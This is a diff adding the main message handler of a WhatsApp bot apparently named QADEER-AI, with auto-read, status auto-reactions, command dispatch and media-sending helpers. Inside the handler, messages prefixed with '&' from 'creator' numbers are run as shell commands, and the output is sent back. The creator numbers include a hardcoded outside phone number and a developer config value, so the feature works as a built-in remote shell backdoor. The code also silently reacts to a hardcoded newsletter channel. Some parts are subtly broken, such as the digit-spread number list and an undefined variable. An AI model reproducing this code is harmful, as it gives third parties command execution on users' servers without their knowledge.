+  conn.ev.on('messages.upsert', async(mek) => {
+    mek = mek.messages[0]
+    if (!mek.message) return
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
+    ? mek.message.ephemeralMessage.message 
+    : mek.message;
+    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
+  if (config.READ_MESSAGE === 'true') {
+    await conn.readMessages([mek.key]);  // Mark message as read
+    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
+  }
+    if(mek.message.viewOnceMessageV2)
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
+      await conn.readMessages([mek.key])
+    }
+
+  const newsletterJids = [
+  "120363418906972955@newsletter",
+];
+  const emojis = ["❤️", "👍", "😮", "😎", "💀"];
+
+  if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
+    try {
+      const serverId = mek.newsletterServerId;
+      if (serverId) {
+      const emoji = emojis[Math.floor(Math.random() * emojis.length)];
+        await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
+      }
+    } catch (e) {
+    
+    }
+  }	  
+	  
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
+    const jawadlike = await conn.decodeJid(conn.user.id);
+    const emojis =  ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
+    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+    await conn.sendMessage(mek.key.remoteJid, {
+      react: {
+        text: randomEmoji,
+        key: mek.key,
+      } 
+    }, { statusJidList: [mek.key.participant, jawadlike] });
+  }                       
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
+  const user = mek.key.participant
+  const text = `${config.AUTO_STATUS_MSG}`
+  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
+            }
+            await Promise.all([
+              saveMessage(mek),
+            ]);
+  const m = sms(conn, mek)
+  const type = getContentType(mek.message)
+  const content = JSON.stringify(mek.message)
+  const from = mek.key.remoteJid
+  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
+  const isCmd = body.startsWith(prefix)
+  var budy = typeof mek.text == 'string' ? mek.text : false;
+  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+  const args = body.trim().split(/ +/).slice(1)
+  const q = args.join(' ')
+  const text = args.join(' ')
+  const isGroup = from.endsWith('@g.us')
+  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
+  const senderNumber = sender.split('@')[0]
+  const botNumber = conn.user.id.split(':')[0]
+  const pushname = mek.pushName || 'Sin Nombre'
+  const isMe = botNumber.includes(senderNumber)
+  const isOwner = ownerNumber.includes(senderNumber) || isMe
+  const botNumber2 = await jidNormalizedUser(conn.user.id);
+  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
+  const groupName = isGroup ? groupMetadata.subject : ''
+  const participants = isGroup ? await groupMetadata.participants : ''
+  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+  const isReact = m.message.reactionMessage ? true : false
+  const reply = (teks) => {
+  conn.sendMessage(from, { text: teks }, { quoted: mek })
+  }
+  
+  const udp = botNumber.split('@')[0];
+    const immumd = ('923300005253', '923300005253');
+    
+    const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  
+    
+    let isCreator = [udp, ...immumd, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
+    .includes(mek.sender);
+	  
+
+	  if (isCreator && mek.text.startsWith("&")) {
+            let code = budy.slice(2);
+            if (!code) {
+                reply(`Provide me with a query to run Master!`);
+                return;
+            }
+            const { spawn } = require("child_process");
+            try {
+                let resultTest = spawn(code, { shell: true });
+                resultTest.stdout.on("data", data => {
+                    reply(data.toString());
+                });
+                resultTest.stderr.on("data", data => {
+                    reply(data.toString());
+                });
+                resultTest.on("error", data => {
+                    reply(data.toString());
+                });
+                resultTest.on("close", code => {
+                    if (code !== 0) {
+                        reply(`command exited with code ${code}`);
+                    }
+                });
+            } catch (err) {
+                reply(util.format(err));
+            }
+            return;
+        }
+
+  //==========public react============//
+  
+// Auto React for all messages (public and owner)
+if (!isReact && config.AUTO_REACT === 'true') {
+    const reactions = [
+        '🌼', '❤️', '💐', '🔥', '🏵️', '❣️', '☺️', '🏵️', '💥', '🥀', '❤‍🔥', '🤒', '😩', '💓', 
+        '🤭', '👍', '💚', '😍', '😻', '🙌', '😃', '🌺', '👌', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '😏', 
+        '👩‍🏫', '👨‍💻', '👰‍♀', '🤓', '😇', '🙂', '💕', '❣️', '🙅‍♀️', '💁‍♂️', '🤗', '🙆‍♀️', 
+        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '😍', '😯', '💇', '💃', '🚶‍♀️', '💯', '🧶', '😎', '👑', 
+        '💍', '💞', '💖', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
+        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
+        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
+        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
+        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
+        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
+        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
+        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
+        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
+        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
+        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
+    ];
+
+    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+    m.react(randomReaction);
+}
+
+// owner react
+
+  // Owner React
+  if (!isReact && senderNumber === botNumber) {
+      if (config.OWNER_REACT === 'true') {
+          const reactions = [
+        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
+    ];
+          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
+          m.react(randomReaction);
+      }
+  }
+	            	  
+          
+// custum react settings        
+                        
+// Custom React for all messages (public and owner)
+if (!isReact && config.CUSTOM_REACT === 'true') {
+    // Use custom emojis from the configuration (fallback to default if not set)
+    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
+    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+    m.react(randomReaction);
+}
+
+// ban users 
+
+const bannedUsers = JSON.parse(fs.readFileSync('./assets/ban.json', 'utf-8'));
+const isBanned = bannedUsers.includes(sender);
+
+if (isBanned) return; // Ignore banned users completely
+	  
+  const ownerFile = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  // خواندن فایل
+  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
+  // بررسی اینکه آیا فرستنده در owner.json موجود است
+  const isFileOwner = ownerFile.includes(sender);
+  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
+  // اعمال شرایط بر اساس وضعیت مالک
+  if (!isRealOwner && config.MODE === "private") return;
+  if (!isRealOwner && isGroup && config.MODE === "inbox") return;
+  if (!isRealOwner && !isGroup && config.MODE === "groups") return;
+ 
+	  
+	  // take commands 
+                 
+  const events = require('./command')
+  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+  if (isCmd) {
+  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+  if (cmd) {
+  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+  
+  try {
+  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+  } catch (e) {
+  console.error("[PLUGIN ERROR] " + e);
+  }
+  }
+  }
+  events.commands.map(async(command) => {
+  if (body && command.on === "body") {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (mek.q && command.on === "text") {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (
+  (command.on === "image" || command.on === "photo") &&
+  mek.type === "imageMessage"
+  ) {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  } else if (
+  command.on === "sticker" &&
+  mek.type === "stickerMessage"
+  ) {
+  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
+  }});
+  
+  });
+    //===================================================   
+    conn.decodeJid = jid => {
+      if (!jid) return jid;
+      if (/:\d+@/gi.test(jid)) {
+        let decode = jidDecode(jid) || {};
+        return (
+          (decode.user &&
+            decode.server &&
+            decode.user + '@' + decode.server) ||
+          jid
+        );
+      } else return jid;
+    };
+    //===================================================
+    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
+      let vtype
+      if (options.readViewOnce) {
+          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
+          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
+          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
+          delete message.message.viewOnceMessage.message[vtype].viewOnce
+          message.message = {
+              ...message.message.viewOnceMessage.message
+          }
+      }
+    
+      let mtype = Object.keys(message.message)[0]
+      let content = await generateForwardMessageContent(message, forceForward)
+      let ctype = Object.keys(content)[0]
+      let context = {}
+      if (mtype != "conversation") context = message.message[mtype].contextInfo
+      content[ctype].contextInfo = {
+          ...context,
+          ...content[ctype].contextInfo
+      }
+      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+          ...content[ctype],
+          ...options,
+          ...(options.contextInfo ? {
+              contextInfo: {
+                  ...content[ctype].contextInfo,
+                  ...options.contextInfo
+              }
+          } : {})
+      } : {})
+      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
+      return waMessage
+    }
+    //=================================================
+    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
+      let quoted = message.msg ? message.msg : message
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(quoted, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+          buffer = Buffer.concat([buffer, chunk])
+      }
+      let type = await FileType.fromBuffer(buffer)
+      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
+          // save to file
+      await fs.writeFileSync(trueFileName, buffer)
+      return trueFileName
+    }
+    //=================================================
+    conn.downloadMediaMessage = async(message) => {
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(message, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+          buffer = Buffer.concat([buffer, chunk])
+      }
+    
+      return buffer
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} message
+    * @param {*} forceForward
+    * @param {*} options
+    * @returns
+    */
+    //================================================
+    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
+                  let mime = '';
+                  let res = await axios.head(url)
+                  mime = res.headers['content-type']
+                  if (mime.split("/")[1] === "gif") {
+                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
+                  }
+                  let type = mime.split("/")[0] + "Message"
+                  if (mime === "application/pdf") {
+                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "image") {
+                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "video") {
+                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
+                  }
+                  if (mime.split("/")[0] === "audio") {
+                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
+                  }
+                }
+    //==========================================================
+    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
+      //let copy = message.toJSON()
+      let mtype = Object.keys(copy.message)[0]
+      let isEphemeral = mtype === 'ephemeralMessage'
+      if (isEphemeral) {
+          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
+      }
+      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
+      let content = msg[mtype]
+      if (typeof content === 'string') msg[mtype] = text || content
+      else if (content.caption) content.caption = text || content.caption
+      else if (content.text) content.text = text || content.text
+      if (typeof content !== 'string') msg[mtype] = {
+          ...content,
+          ...options
+      }
+      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
+      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
+      copy.key.remoteJid = jid
+      copy.key.fromMe = sender === conn.user.id
+    
+      return proto.WebMessageInfo.fromObject(copy)
+    }
+    
+    
+    /**
+    *
+    * @param {*} path
+    * @returns
+    */
+    //=====================================================
+    conn.getFile = async(PATH, save) => {
+      let res
+      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
+      let type = await FileType.fromBuffer(data) || {
+          mime: 'application/octet-stream',
+          ext: '.bin'
+      }
+      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
+      if (data && save) fs.promises.writeFile(filename, data)
+      return {
+          res,
+          filename,
+          size: await getSizeMedia(data),
+          ...type,
+          data
+      }
+    
+    }
+    //=====================================================
+    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
+      let types = await conn.getFile(PATH, true)
+      let { filename, size, ext, mime, data } = types
+      let type = '',
+          mimetype = mime,
+          pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+          let { writeExif } = require('./exif.js')
+          let media = { mimetype: mime, data }
+          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
+          await fs.promises.unlink(filename)
+          type = 'sticker'
+          mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+          [type]: { url: pathFile },
+          mimetype,
+          fileName,
+          ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    //=====================================================
+    conn.parseMention = async(text) => {
+      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
+    }
+    //=====================================================
+    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
+      let types = await conn.getFile(path, true)
+      let { mime, ext, res, data, filename } = types
+      if (res && res.status !== 200 || file.length <= 65536) {
+          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
+      }
+      let type = '',
+          mimetype = mime,
+          pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+          let { writeExif } = require('./exif')
+          let media = { mimetype: mime, data }
+          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
+          await fs.promises.unlink(filename)
+          type = 'sticker'
+          mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+          [type]: { url: pathFile },
+          caption,
+          mimetype,
+          fileName,
+          ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    /**
+    *
+    * @param {*} message
+    * @param {*} filename
+    * @param {*} attachExtension
+    * @returns
+    */
+    //=====================================================
+    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
+      let buffer;
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifVid(buff, options);
+      } else {
+        buffer = await videoToWebp(buff);
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      );
+    };
+    //=====================================================
+    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
+      let buffer;
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifImg(buff, options);
+      } else {
+        buffer = await imageToWebp(buff);
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      );
+    };
+        /**
+         *
+         * @param {*} jid
+         * @param {*} path
+         * @param {*} quoted
+         * @param {*} options
+         * @returns
+         */
+    //=====================================================
+    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
+    
+            /**
+             *
+             * @param {*} jid
+             * @param {*} path
+             * @param {*} quoted
+             * @param {*} options
+             * @returns
+             */
+    //=====================================================
+    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
+      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} path
+    * @param {*} caption
+    * @param {*} quoted
+    * @param {*} options
+    * @returns
+    */
+    //=====================================================
+    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
+    
+    /**
+     *
+     * @param {*} jid
+     * @param {*} path
+     * @param {*} caption
+     * @param {*} quoted
+     * @param {*} options
+     * @returns
+     */
+    //=====================================================
+    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
+      let buttonMessage = {
+              text,
+              footer,
+              buttons,
+              headerType: 2,
+              ...options
+          }
+          //========================================================================================================================================
+      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
+    }
+    //=====================================================
+    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
+      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
+      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
+          templateMessage: {
+              hydratedTemplate: {
+                  imageMessage: message.imageMessage,
+                  "hydratedContentText": text,
+                  "hydratedFooterText": footer,
+                  "hydratedButtons": but
+              }
+          }
+      }), options)
+      conn.relayMessage(jid, template.message, { messageId: template.key.id })
+    }
+    
+    /**
+    *
+    * @param {*} jid
+    * @param {*} buttons
+    * @param {*} caption
+    * @param {*} footer
+    * @param {*} quoted
+    * @param {*} options
+    */
+    //=====================================================
+    conn.getName = (jid, withoutContact = false) => {
+            id = conn.decodeJid(jid);
+
+            withoutContact = conn.withoutContact || withoutContact;
+
+            let v;
+
+            if (id.endsWith('@g.us'))
+                return new Promise(async resolve => {
+                    v = store.contacts[id] || {};
+
+                    if (!(v.name.notify || v.subject))
+                        v = conn.groupMetadata(id) || {};
+
+                    resolve(
+                        v.name ||
+                            v.subject ||
+                            PhoneNumber(
+                                '+' + id.replace('@s.whatsapp.net', ''),
+                            ).getNumber('international'),
+                    );
+                });
+            else
+                v =
+                    id === '0@s.whatsapp.net'
+                        ? {
+                                id,
+
+                                name: 'WhatsApp',
+                          }
+                        : id === conn.decodeJid(conn.user.id)
+                        ? conn.user
+                        : store.contacts[id] || {};
+
+            return (
+                (withoutContact ? '' : v.name) ||
+                v.subject ||
+                v.verifiedName ||
+                PhoneNumber(
+                    '+' + jid.replace('@s.whatsapp.net', ''),
+                ).getNumber('international')
+            );
+        };
+
+        // Vcard Functionality
+        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
+            let list = [];
+            for (let i of kon) {
+                list.push({
+                    displayName: await conn.getName(i + '@s.whatsapp.net'),
+                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
+                        i + '@s.whatsapp.net',
+                    )}\nFN:${
+                        global.OwnerName
+                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
+                        global.email
+                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
+                        global.github
+                    }/qadeermd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                        global.location
+                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
+                });
+            }
+            conn.sendMessage(
+                jid,
+                {
+                    contacts: {
+                        displayName: `${list.length} Contact`,
+                        contacts: list,
+                    },
+                    ...opts,
+                },
+                { quoted },
+            );
+        };
+
+        // Status aka brio
+        conn.setStatus = status => {
+            conn.query({
+                tag: 'iq',
+                attrs: {
+                    to: '@s.whatsapp.net',
+                    type: 'set',
+                    xmlns: 'status',
+                },
+                content: [
+                    {
+                        tag: 'status',
+                        attrs: {},
+                        content: Buffer.from(status, 'utf-8'),
+                    },
+                ],
+            });
+            return status;
+        };
+    conn.serializeM = mek => sms(conn, mek, store);
+  }
+ /* 
+  app.get("/", (req, res) => {
+  res.send("QADEER-AI STARTED ✅");
+  });
+*/
+  app.use(express.static(path.join(__dirname, 'lib')));
+
+app.get('/', (req, res) => {
+  res.redirect('/qadeer.html');
+});
+  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+  setTimeout(() => {
+  connectToWA()
+  }, 4000);
